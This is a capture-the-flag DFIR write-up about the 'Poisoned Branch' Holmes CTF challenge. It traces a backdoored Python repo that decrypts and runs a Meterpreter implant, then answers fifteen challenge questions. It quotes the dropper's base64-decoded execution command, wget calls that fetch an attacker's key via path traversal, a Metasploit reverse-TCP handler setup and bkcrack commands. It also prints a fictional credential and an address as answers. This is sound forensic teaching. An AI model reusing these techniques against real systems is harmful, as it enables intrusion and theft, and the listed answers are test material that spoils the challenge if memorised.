@@ -1,0 +1,146 @@
+← back to write-ups
+Hassan Abkow
+Poisoned Branch
+Event: Holmes CTF 2026 — Sherlock 05
+Category: DFIR / Threat Intel
+Date: Sep 17, 2026
+Read Time: ~10 minutes
+Overview
+A contractor installed a public repo that looked useful and turned out to be backdoored. It dropped a Meterpreter implant, the implant called home to an APT operator, and that operator used the access to hunt down and steal a sensitive HR document before cleaning up after himself. The job was to reconstruct the whole chain from the artifacts, then turn the attacker's own exposed server against him to recover what was taken. Fifteen questions, all answered.
+
+Challenge Description
+Contractor Tom Ainsworth (host LT-TAinsworth) pulled down a repo called diogenes-ticket-parser. It shipped a malicious "integrity check" that ran on startup, dropped an implant, and gave the NAPOLEON crew (operator: Sebastian Moran) a foothold. Moran pivoted, located an "Emergency Call-Out Roster" belonging to HR, exfiltrated it, deleted the original, and wiped his tracks.
+
+We were handed:
+
+Tom.zip — Tom's home directory (repos, docs, SSH keys, bash history)
+uac_output/ — a UAC triage collection from the host (audit log, process/network state, shell histories)
+The story PDF (chapters 06–07)
+A live box, 10.129.4.141 = BlackPearl2026.htb, which is Moran's own server, running a Flask file-exchange app on port 9999
+The objective breaks into three parts: work out how the box got infected, reconstruct what the attacker did on it, then go into his server and recover the stolen roster to identify a redacted person.
+
+Initial Analysis
+First pass over the artifacts, before touching the live box:
+
+Tom's Projects/ folder held several repos. One of them, diogenes-ticket-parser, advertised in its README that it runs a "lightweight integrity check during startup." That phrasing is a red flag on its own — startup code doing something it doesn't need to.
+The uac_output/ triage had the good stuff: the process list, socket state (ss), and /var/log/audit/audit.log. On Linux, auditd is where an attacker's shell session gets recorded whether they like it or not.
+The story PDF named Sebastian Moran and the "BlackPearl" server, which lined up with the live target.
+Tools used: git/plain file reading for the repo, a text editor for the Python loader, strings/file to identify the implant binary, grep over the audit log, and later bkcrack for the zip crack at the end.
+
+Solution Approach
+Step 1 — The poisoned repo
+Reading the git metadata on diogenes-ticket-parser gave up the source and the author immediately:
+
+remote.origin.url = http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git
+Author: Sebastain Moran <cbass.Moran@blackpearl2026.htb>
+So the malicious repo is diogenes-ticket-parser, authored by cbass.Moran@blackpearl2026.htb.
+
+Step 2 — Loader, payload, and implant
+The entry script ticket_parser.py imports and calls telemetry.validate_environment(). That "integrity check" is where the real behaviour lives. Reading telemetry.py:
+
+# telemetry.py (trimmed)
+reconstructed = repeating(image_data, calibration_data)   # XOR of diogenes.jpg against calibration.bin
+cache_dir = ~/.cache/.ticket-parser                        # path assembled from base64 fragments
+reconstructed_path.write_bytes(reconstructed)              # writes ~/.cache/.ticket-parser/.integrity
+subprocess.run(base64.b64decode(_CALIBRATION), shell=True) # chmod +x, then run in the background
+_CALIBRATION base64-decodes to:
+
+chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &
+So calibration.bin is the encrypted payload — XOR'd with diogenes.jpg as the key. Decrypting it produces .integrity, an ELF x86-64 that identifies as Metasploit's mettle. That gives the payload file (calibration.bin) and the implant path (/home/Tom/.cache/.ticket-parser/.integrity).
+
+Step 3 — Callback and live process state
+Straight out of the UAC network and process capture:
+
+ss:  ESTAB 192.168.0.21:50878 -> 203.0.113.10:31337  users:((".integrity",pid=1514,fd=4))
+ps:  Tom  1514  1  /home/Tom/.cache/.ticket-parser/.integrity
+The implant connected back on port 31337, running as PID 1514 (its parent is PID 1).
+
+Step 4 — Reconstructing on-host activity from auditd
+/var/log/audit/audit.log recorded the Meterpreter /bin/sh children as execve events, with PIDs, PPIDs, and hex-encoded arguments. Decoding them:
+
+pid 1520 (ppid 1516)  wget -q --header=Cookie: X-Operator-Auth=napoleon_moran_1894 -O authorized_keys \
+                         http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub
+pid 1528 (ppid 1525)  wget ... http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub
+pid 1551 (ppid 1549)  rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
+What this shows: Moran pulled his own public key through the server's path-traversal endpoint and wrote it into Tom's authorized_keys for SSH persistence. He tried the hostname first, then fell back to the raw IP. He then deleted the roster on his way out.
+
+URL:PORT tried first: BlackPearl2026.htb:9999 (before 203.0.113.10:9999). To reach the live box for the later flags you point that hostname at the spawned VM's IP in /etc/hosts — the challenge expects it.
+Cookie/token: X-Operator-Auth=napoleon_moran_1894
+Delete command: rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf, with PPID 1549
+Step 5 — Into the attacker's server
+The same path-traversal (/download?file=.., gated by that cookie) let me read Moran's Metasploit history at ~/.msf4/history:
+
+use exploit/multi/handler
+set lport 31337
+set lhost blackpearl2026.htb
+set payload linux/x64/meterpreter_reverse_tcp
+run
+The payload line is the one that declares the architecture: set payload linux/x64/meterpreter_reverse_tcp.
+
+Reading Flask_server/app.py showed /download was rooted at PUBLIC_DIR = /home/moran/Flask_server/public, so ../../X resolves to /home/moran/X, and it defined UPLOAD_DIR = /home/moran/Exfiltrated_Loot. Flask ran as moran, so the same traversal happily served moran's own private key at ../../.ssh/id_rsa — which is an SSH login as moran.
+
+Once in, ~/Exfiltrated_Loot/ held LOOT.zip plus a README.txt that basically narrated the plan: "Package into a password protected zip. Remove remnants."
+
+The locate command came from ~/.msf4/meterpreter_history (which survives even when bash history is wiped):
+
+search -d ONBOARDING
+search -d ONBOARDING -f *.pdf
+search -f *.pdf
+The directory+file combo is search -d ONBOARDING -f *.pdf.
+
+Step 6 — Cracking LOOT.zip
+LOOT.zip used legacy ZipCrypto (shows up as $pkzip$), so wordlists went nowhere. But the archive contained a README.txt (deflated, CRC32 e4d5acac) and I already had the exact plaintext of that file sitting in Exfiltrated_Loot/README.txt on moran's box. Its CRC32 matched byte-for-byte — everything you need for a known-plaintext attack with bkcrack (see the code section). Cracking it decrypted the roster PDF, which listed exactly one employee with the position field redacted: Sarah Kemp.
+
+Code / Exploit
+The ZipCrypto known-plaintext attack, which was the actual "exploit" in this challenge:
+
+# We have the exact plaintext of README.txt from moran's Exfiltrated_Loot folder,
+# and its CRC32 matches the README.txt entry inside LOOT.zip.
+
+# 1) Recover the internal keys from the known plaintext
+bkcrack -C LOOT.zip -c README.txt -P plain.zip -p README.txt
+# -> keys: 85b6bbc1 27824945 ce665bee
+
+# 2) Use the recovered keys to decrypt the other entries
+bkcrack -C LOOT.zip -c cvoss_exfil -k 85b6bbc1 27824945 ce665bee -d cvoss_exfil.out
+bkcrack -C LOOT.zip -c Gov_HR_..._Roster.pdf -k 85b6bbc1 27824945 ce665bee -d roster.pdf
+# roster.pdf then needs a raw-inflate to become a valid PDF
+cvoss_exfil turned out to hold Tom's stolen creds: tainsworth:d10g3n3s_T1ck3ts#2026:forever.
+
+Technical Details
+The dropper: a Python "integrity check" that assembles file paths from base64 fragments and shells out via subprocess.run(shell=True). The payload was hidden with a repeating-key XOR (diogenes.jpg as the key against calibration.bin).
+The implant: Metasploit mettle (the native Meterpreter), identifiable from its build strings, calling back linux/x64/meterpreter_reverse_tcp on 31337.
+The web vuln: classic path traversal against a Flask send_file-style /download endpoint with no sanitisation, gated only by a static cookie. Because the service ran as moran, it would read any file moran could — including his SSH private key.
+The crypto: ZipCrypto is broken against known plaintext. bkcrack recovers the three internal 32-bit keys from a single known file and then decrypts every entry in the archive.
+Key Insights
+A startup "integrity check" that builds paths out of base64 and calls subprocess.run is not checking integrity. Read the imported module, not just the entry point.
+Meterpreter keeps its own history (~/.msf4/meterpreter_history) separate from the shell's, so wiping .bash_history doesn't cover the attacker's tracks the way they think it does.
+auditd execve records rebuild a whole attacker session for you if you decode the hex args and follow the pid/ppid links.
+If you can find the plaintext of any one file inside a ZipCrypto archive — a bundled README is a gift — the whole archive falls open. Remember to raw-inflate the deciphered deflate stream to recover the real file.
+What was new to me
+This challenge pushed me into a few things I hadn't really used in anger before. bkcrack and the whole idea of a ZipCrypto known-plaintext attack was new — I knew ZipCrypto was weak, but actually recovering the internal keys from one known file and unlocking the rest of the archive was the first time I'd done it hands-on. Rebuilding an attacker's shell session from raw auditd execve records, following the pid/ppid chain and hex-decoding the arguments, was also a technique I got a lot more comfortable with here. And the detail that Meterpreter keeps its own history separate from .bash_history is one of those things I'll remember for every future case.
+
+The Answers
+Holmes CTF Sherlocks submit one answer per question rather than a single flag{}. Final answers:
+
+#	Question	Answer
+1	What was the name of the malicious repository? (string)	diogenes-ticket-parser
+2	What email address is listed for the author of the repo? (email address)	cbass.Moran@blackpearl2026.htb
+3	What file holds the encrypted payload? (filename.ext)	calibration.bin
+4	What is the full path of the c2 implant? (/path/to/file)	/home/Tom/.cache/.ticket-parser/.integrity
+5	What port did the implant connect back to? (number)	31337
+6	What is the pid of the implant? (number)	1514
+7	The attacker tried to use URL:PORT before using IP:PORT to download a file to Tom's machine. What was the URL:PORT combo? (set the spawned vm IP to this URL in your /etc/hosts to complete the challenge)	BlackPearl2026.htb:9999
+8	What is the name of the Cookie/Token for the attackers web server? (Header=value)	X-Operator-Auth=napoleon_moran_1894
+9	The attacker deleted a file before leaving. What command did they run? (string)	rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
+10	What was the ppid of the command from the previous question? (number)	1549
+11	While preparing the listener the attacker declared the architecture of the implant. What command did they use? (string)	set payload linux/x64/meterpreter_reverse_tcp
+12	The attacker attempted to locate a specific directory and file combo. What command did they run? (string)	search -d ONBOARDING -f *.pdf
+13	What is the name of the file the attacker is keeping the exfiltrated documents in? (filename.ext)	LOOT.zip
+14	What is the name of the person that has their position redacted? (FirstName LastName)	Sarah Kemp
+15	What is the address of the previously identified person? (string)	Flat 6, Ashdown House, Palace Court, London W2 4LS
+Resources
+bkcrack — ZipCrypto known-plaintext attack tool
+Metasploit mettle / Meterpreter payloads
+Linux auditd documentation
+Hassan Abkow · hassanabkow.com · github.com/xghxstx
